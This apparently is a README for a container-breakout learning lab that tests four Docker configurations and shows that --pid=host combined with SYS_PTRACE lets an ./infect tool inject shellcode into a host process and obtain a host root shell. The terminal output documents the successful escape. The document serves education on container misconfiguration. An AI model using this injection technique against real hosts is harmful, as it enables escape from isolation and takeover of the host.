# Container Breakout Learning

"Container Breakout" learning application.

It is explaining the "Container Breakout" when the "`--pid=host`" and "`--cap-add=SYS_PTRACE`" options are specified at container startup.

## Reference

[Container Breakout – Part 1](https://tbhaxor.com/container-breakout-part-1/#lab-process-injection)

## Environment

Tried on Amazon Linux 2023.

```
# uname -a
Linux ip-172-31-33-251.ap-northeast-1.compute.internal 6.1.27-43.48.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue May  2 04:53:36 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# docker --version
Docker version 20.10.23, build 7155243
```

### Preparation

Starts an HTTP server on the host machine.  
After, Execute a "Process injection Attack" against this process.

```
# python3 -m http.server 10080 &

# ps au
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root        2130  0.0  0.0 221344  1084 tty1     Ss+  11:28   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        2131  0.0  0.0 221388  1084 ttyS0    Ss+  11:28   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
ec2-user   72976  0.0  0.2 233060  5004 pts/1    Ss   14:29   0:00 -bash
root       72999  0.0  0.4 260292  8276 pts/1    S    14:29   0:00 sudo su -
root       73001  0.0  0.2 245536  4712 pts/1    S    14:29   0:00 su -
root       73002  0.0  0.2 233188  5100 pts/1    S    14:29   0:00 -bash
root       74067  0.0  0.9 241204 18056 pts/1    S    14:31   0:00 /root/.pyenv/versions/3.9.16/bin/python3 -m http.server 10080
root       78647  0.0  0.1 232520  2776 pts/1    R+   14:46   0:00 ps au
```

## Run

```
-- Run container
# make up

-- Execute to container bash
# make app
```

| Setting Pattern | Container Breakout |
| - | - |
| Pattern 1 | Fail |
| Pattern 2 | Fail |
| Pattern 3 | Fail |
| Pattern 4 | **Succeed** |

### Pattern 1

| Vulnerability Args | |
| - | - |
| --pid=host | x |
| --cap-add=SYS_PTRACE | x |

```
root@b1e9750ed68c:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
      1 pts/0    Ss+    0:00 bash
      7 pts/1    Ss     0:00 bash
     13 pts/1    R+     0:00 ps a
```

```
root@b1e9750ed68c:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

```
root@b1e9750ed68c:/usr/poc# ./infect 74067
+ Tracing process 74067
ptrace(ATTACH):: No such process
```

### Pattern 2

| Vulnerability Setting | |
| - | - |
| --pid=host | x |
| --cap-add=SYS_PTRACE | o |

```
root@37ae5c031be6:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
      1 pts/0    Ss+    0:00 bash
      7 pts/1    Ss     0:00 bash
     13 pts/1    R+     0:00 ps a
```

```
root@37ae5c031be6:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

```
root@3241904b2741:/usr/poc# ./infect 74067
+ Tracing process 74067
ptrace(ATTACH):: No such process
```


### Pattern 3

| Vulnerability Setting | |
| - | - |
| --pid=host | o |
| --cap-add=SYS_PTRACE | x |

```
root@f71f748ca3c7:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
   2130 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --noclear - linux
   2131 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
  72976 pts/1    Ss     0:00 -bash
  72999 pts/1    S      0:00 sudo su -
  73001 pts/1    S      0:00 su -
  73002 pts/1    S      0:00 -bash
  74067 pts/1    S      0:00 /root/.pyenv/versions/3.9.16/bin/python3 -m http.server 10080
  76982 pts/0    Ss+    0:00 bash
  77229 pts/1    S+     0:00 make app
  77230 pts/1    Sl+    0:00 docker-compose exec app bash
  77246 pts/1    Ss     0:00 bash
  77254 pts/1    R+     0:00 ps a
```

```
root@f71f748ca3c7:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

```
root@f71f748ca3c7:/usr/poc# ./infect 74067
+ Tracing process 74067
ptrace(ATTACH):: Operation not permitted
```

### Pattern 4

| Vulnerability Setting | |
| - | - |
| --pid=host | o |
| --cap-add=SYS_PTRACE | o |

```
root@b9ceb8fb7c89:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
   2130 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --noclear - linux
   2131 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
   2401 pts/0    Ss     0:00 -bash
   2424 pts/0    S      0:00 sudo su -
   2426 pts/0    S      0:00 su -
   2427 pts/0    S+     0:00 -bash
  65349 pts/0    T      0:00
  66006 pts/0    Ss+    0:00 bash
  72976 pts/1    Ss     0:00 -bash
  72999 pts/1    S      0:00 sudo su -
  73001 pts/1    S      0:00 su -
  73002 pts/1    S      0:00 -bash
  74067 pts/1    S      0:00 /root/.pyenv/versions/3.9.16/bin/python3 -m http.server 10080
  74440 pts/1    S+     0:00 make app
  74441 pts/1    Sl+    0:00 docker-compose exec app bash
  74457 pts/1    Ss     0:00 bash
  74464 pts/1    R+     0:00 ps a
```

```
root@b9ceb8fb7c89:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

```
root@aa6559b6c94d:/usr/poc# ./infect 74067
+ Tracing process 74067
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f55f4d42987
+ Setting instruction pointer to 0x7f55f4d42989
+ Run it!

id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

docker --version
Docker version 20.10.23, build 7155243
```
